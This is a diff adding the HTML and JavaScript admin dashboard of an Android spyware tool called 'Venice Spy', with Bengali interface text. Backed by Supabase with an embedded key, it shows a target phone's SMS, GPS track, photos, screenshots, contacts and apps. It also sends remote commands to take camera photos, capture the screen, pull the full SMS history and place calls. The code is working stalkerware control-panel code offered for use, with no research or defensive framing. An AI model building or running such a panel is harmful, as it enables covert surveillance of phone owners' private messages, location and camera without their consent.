@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Venice Spy · Admin</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+:root{--bg:#0b0f14;--card:#121821;--line:#1e2733;--fg:#e6edf3;--mut:#8b98a8;--acc:#4ade80}
+*{box-sizing:border-box}
+body{margin:0;font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--fg)}
+header{display:flex;gap:10px;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:9;flex-wrap:wrap}
+.brand{font-weight:700;color:var(--acc);letter-spacing:.5px}
+select,button,input{background:var(--card);color:var(--fg);border:1px solid var(--line);border-radius:8px;padding:8px 12px;font:inherit}
+button{cursor:pointer}
+button:hover{border-color:var(--acc);color:var(--acc)}
+select{margin-left:auto;min-width:220px}
+nav{display:flex;gap:6px;padding:10px 16px;border-bottom:1px solid var(--line);overflow-x:auto}
+nav button{border-radius:20px;font-size:13px;white-space:nowrap}
+nav button.on{background:var(--acc);color:#06210f;border-color:var(--acc);font-weight:600}
+main{padding:16px;max-width:1100px;margin:0 auto}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:12px}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.mut{color:var(--mut);font-size:12px}
+.sms{border-left:3px solid var(--acc);padding:8px 12px;margin-bottom:8px;background:#0e141c;border-radius:0 8px 8px 0}
+.sms .who{font-weight:600;color:var(--acc)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:10px}
+.grid img{width:100%;border-radius:8px;cursor:pointer;border:1px solid var(--line)}
+#map{height:380px;border-radius:12px;border:1px solid var(--line)}
+table{width:100%;border-collapse:collapse;font-size:13px}
+td,th{padding:7px;border-bottom:1px solid var(--line);text-align:left}
+.badge{font-size:11px;padding:2px 8px;border-radius:20px;background:#1c2530;color:var(--mut)}
+.ok{color:var(--acc)}
+.hidden{display:none}
+#lightbox{position:fixed;inset:0;background:#000d;display:none;align-items:center;justify-content:center;z-index:99}
+#lightbox img{max-width:92vw;max-height:92vh}
+</style>
+</head>
+<body>
+
+<header>
+  <span class="brand">◈ VENICE SPY</span>
+  <span class="mut" id="live">●</span>
+  <select id="dev"></select>
+  <button onclick="loadAll()">↻ Refresh</button>
+</header>
+
+<nav>
+  <button class="on" data-t="dash">Dashboard</button>
+  <button data-t="sms">Messages</button>
+  <button data-t="loc">Location</button>
+  <button data-t="media">Photos / Screen</button>
+  <button data-t="people">Contacts</button>
+  <button data-t="apps">Apps</button>
+  <button data-t="cmds">Commands</button>
+</nav>
+
+<main>
+  <section id="t-dash"></section>
+  <section id="t-sms" class="hidden"></section>
+  <section id="t-loc" class="hidden"></section>
+  <section id="t-media" class="hidden"></section>
+  <section id="t-people" class="hidden"></section>
+  <section id="t-apps" class="hidden"></section>
+  <section id="t-cmds" class="hidden"></section>
+</main>
+
+<div id="lightbox" onclick="this.style.display='none'"><img id="lbimg"/></div>
+
+<script>
+/* ============ এখানে তোমার Supabase ডেটা বসাও ============ */
+const SUPA_URL = "https://cffrjobmdvpqcwnmtiav.supabase.co";
+const SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNmZnJqb2JtZHZwcWN3bm10aWF2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTMwMTkxOTUsImV4cCI6MjEwODU5NTE5NX0.N9YQX5_ebAa47zRFUIClybz0Wz40ocy58StXkriM3vU";
+/* ======================================================== */
+
+const sb = supabase.createClient(SUPA_URL, SUPA_KEY);
+let DEV = null, map = null, marker = null, tab = 'dash';
+
+const $ = id => document.getElementById(id);
+const esc = s => (s ?? '').toString().replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+const dt = t => t ? new Date(t).toLocaleString() : '';
+
+/* ---------- tabs ---------- */
+document.querySelectorAll('nav button').forEach(b => b.onclick = () => {
+  document.querySelectorAll('nav button').forEach(x => x.classList.remove('on'));
+  b.classList.add('on'); tab = b.dataset.t;
+  document.querySelectorAll('main section').forEach(s => s.classList.add('hidden'));
+  $('t-' + tab).classList.remove('hidden');
+  loadTab();
+});
+
+/* ---------- devices ---------- */
+async function loadDevices() {
+  const { data } = await sb.from('devices').select('*').order('last_seen', { ascending: false });
+  const sel = $('dev');
+  sel.innerHTML = '';
+  if (!data || !data.length) { sel.innerHTML = '<option>কোনো ফোন নেই</option>'; return; }
+  data.forEach(d => {
+    const o = document.createElement('option');
+    o.value = d.id;
+    const on = d.last_seen && (Date.now() - new Date(d.last_seen)) < 300000;
+    o.textContent = `${on ? '🟢' : '⚪'} ${d.name || 'Unknown'} · ${d.id.slice(0,6)}`;
+    sel.appendChild(o);
+  });
+  if (!DEV) DEV = data[0].id;
+  sel.value = DEV;
+  sel.onchange = () => { DEV = sel.value; loadAll(); };
+  renderDash(data);
+}
+
+async function renderDash(devs) {
+  const d = devs.find(x => x.id === DEV);
+  const { count: nSms } = await sb.from('sms').select('*', { count: 'exact', head: true }).eq('device_id', DEV);
+  const { count: nMed } = await sb.from('media').select('*', { count: 'exact', head: true }).eq('device_id', DEV);
+  $('t-dash').innerHTML = `
+    <div class="card">
+      <h3 style="margin:0 0 8px">${esc(d?.name || 'Unknown device')}</h3>
+      <div class="mut">${esc(d?.brand)} · Android ${esc(d?.android)} · ID ${esc(d?.id)}</div>
+      <div class="row" style="margin-top:10px">
+        <span class="badge">🔋 ${d?.battery ?? '?'}%</span>
+        <span class="badge">SMS ${nSms ?? 0}</span>
+        <span class="badge">Media ${nMed ?? 0}</span>
+        <span class="badge">Last seen ${dt(d?.last_seen)}</span>
+      </div>
+    </div>
+    <div class="card">
+      <b>Quick actions</b>
+      <div class="row" style="margin-top:10px">
+        <button onclick="cmd('photo')">📷 পেছনের ক্যামেরা</button>
+        <button onclick="cmd('photo',{cam:'front'})">🤳 সামনের ক্যামেরা</button>
+        <button onclick="cmd('screen',{frames:1})">🖥 স্ক্রিনশট</button>
+        <button onclick="cmd('screen',{frames:8})">🎬 ৮ ফ্রেম</button>
+        <button onclick="cmd('location')">📍 লোকেশন</button>
+        <button onclick="cmd('sms_sync',{full:true})">💬 পুরো SMS</button>
+        <button onclick="cmd('contacts')">👥 কন্টাক্ট</button>
+        <button onclick="cmd('apps')">📦 অ্যাপ লিস্ট</button>
+        <button onclick="cmd('call')">📞 মিস কল</button>
+        <button onclick="cmd('sync_all')">⟳ সব সিঙ্ক</button>
+      </div>
+    </div>
+    <div class="card"><b>সর্বশেষ ৫টা মেসেজ</b><div id="dashSms" style="margin-top:10px"></div></div>`;
+
+  const { data: s } = await sb.from('sms').select('*').eq('device_id', DEV)
+    .order('ts', { ascending: false }).limit(5);
+  $('dashSms').innerHTML = (s || []).map(x =>
+    `<div class="sms"><span class="who">${esc(x.address)}</span> <span class="mut">${dt(x.ts)}</span><br>${esc(x.body)}</div>`
+  ).join('') || '<div class="mut">কিছু নেই</div>';
+}
+
+/* ---------- data tabs ---------- */
+async function loadSms() {
+  const { data } = await sb.from('sms').select('*').eq('device_id', DEV)
+    .order('ts', { ascending: false }).limit(400);
+  $('t-sms').innerHTML = `<div class="card"><b>${(data||[]).length} messages</b></div>` +
+    (data || []).map(x => `<div class="sms"><span class="who">${esc(x.address)}</span>
+      <span class="badge">${x.direction === 'out' ? 'sent' : 'inbox'}</span>
+      <span class="mut">${dt(x.ts)}</span><br>${esc(x.body)}</div>`).join('');
+}
+
+async function loadLoc() {
+  const { data } = await sb.from('locations').select('*').eq('device_id', DEV)
+    .order('ts', { ascending: false }).limit(300);
+  $('t-loc').innerHTML = `<div class="card"><div id="map"></div>
+    <div class="mut" style="margin-top:8px">${(data||[]).length} টা লোকেশন পয়েন্ট</div></div>
+    <div class="card"><table><tr><th>সময়</th><th>Lat</th><th>Lng</th><th>Accuracy</th></tr>
+    ${(data||[]).slice(0,60).map(x=>`<tr><td>${dt(x.ts)}</td><td>${x.lat?.toFixed(5)}</td><td>${x.lng?.toFixed(5)}</td><td>${Math.round(x.accuracy||0)}m</td></tr>`).join('')}
+    </table></div>`;
+  const first = data && data[0];
+  map = L.map('map').setView([first?.lat || 23.8, first?.lng || 90.4], 15);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: 'OSM' }).addTo(map);
+  if (data) data.slice().reverse().forEach(p => L.circleMarker([p.lat, p.lng], { radius: 4, color: '#4ade80' }).addTo(map));
+  if (first) {
+    marker = L.marker([first.lat, first.lng]).addTo(map).bindPopup('সর্বশেষ: ' + dt(first.ts)).openPopup();
+  }
+}
+
+async function loadMedia() {
+  const { data } = await sb.from('media').select('*').eq('device_id', DEV)
+    .order('ts', { ascending: false }).limit(200);
+  $('t-media').innerHTML = `<div class="card"><b>${(data||[]).length} files</b></div>
+    <div class="grid">${(data||[]).map(x=>`<div>
+      <img src="${x.url}" onclick="zoom('${x.url}')"/>
+      <div class="mut">${x.kind} · ${dt(x.ts)}</div></div>`).join('')}</div>`;
+}
+
+async function loadPeople() {
+  const { data } = await sb.from('contacts').select('*').eq('device_id', DEV).order('name').limit(2000);
+  $('t-people').innerHTML = `<div class="card"><b>${(data||[]).length} contacts</b></div>
+    <div class="card"><table><tr><th>নাম</th><th>নম্বর</th></tr>
+    ${(data||[]).map(x=>`<tr><td>${esc(x.name)}</td><td>${esc(x.phone)}</td></tr>`).join('')}</table></div>`;
+}
+
+async function loadApps() {
+  const { data } = await sb.from('apps').select('*').eq('device_id', DEV).order('label').limit(1000);
+  $('t-apps').innerHTML = `<div class="card"><b>${(data||[]).length} apps</b></div>
+    <div class="card"><table><tr><th>অ্যাপ</th><th>প্যাকেজ</th><th>Ver</th></tr>
+    ${(data||[]).map(x=>`<tr><td>${esc(x.label)}</td><td class="mut">${esc(x.package)}</td><td>${esc(x.version)}</td></tr>`).join('')}</table></div>`;
+}
+
+async function loadCmds() {
+  const { data } = await sb.from('commands').select('*').eq('device_id', DEV)
+    .order('id', { ascending: false }).limit(60);
+  $('t-cmds').innerHTML = `<div class="card"><b>Command history</b></div>
+    <div class="card"><table><tr><th>সময়</th><th>কমান্ড</th><th>স্ট্যাটাস</th><th>রেজাল্ট</th></tr>
+    ${(data||[]).map(x=>`<tr><td class="mut">${dt(x.created_at)}</td><td>${esc(x.cmd)}</td>
+      <td class="${x.status==='done'?'ok':''}">${esc(x.status)}</td><td class="mut">${esc(x.result||'')}</td></tr>`).join('')}</table></div>`;
+}
+
+/* ---------- actions ---------- */
+async function cmd(type, params = {}) {
+  if (!DEV) return;
+  await sb.from('commands').insert({ device_id: DEV, cmd: type, params });
+  toast('✔ ' + type + ' পাঠানো হয়েছে');
+}
+
+function toast(t) {
+  const d = document.createElement('div');
+  d.textContent = t;
+  d.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#4ade80;color:#06210f;padding:10px 18px;border-radius:20px;font-weight:600;z-index:200';
+  document.body.appendChild(d);
+  setTimeout(() => d.remove(), 2200);
+}
+
+function zoom(u) { $('lbimg').src = u; $('lightbox').style.display = 'flex'; }
+
+function loadTab() {
+  if (tab === 'dash') return loadDevices();
+  if (tab === 'sms') return loadSms();
+  if (tab === 'loc') return loadLoc();
+  if (tab === 'media') return loadMedia();
+  if (tab === 'people') return loadPeople();
+  if (tab === 'apps') return loadApps();
+  if (tab === 'cmds') return loadCmds();
+}
+
+function loadAll() { loadDevices(); loadTab(); }
+
+/* ---------- realtime ---------- */
+sb.channel('rt')
+  .on('postgres_changes', { event: '*', schema: 'public', table: 'sms' }, () => {
+    if (tab === 'sms') loadSms(); if (tab === 'dash') loadDevices();
+  })
+  .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'locations' }, () => {
+    if (tab === 'loc') loadLoc();
+  })
+  .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'media' }, () => {
+    if (tab === 'media') loadMedia();
+  })
+  .subscribe(s => { $('live').className = s === 'SUBSCRIBED' ? 'ok' : 'mut'; });
+
+loadAll();
+setInterval(() => { if (tab === 'dash') loadDevices(); }, 30000);
+</script>
+</body>
+</html>
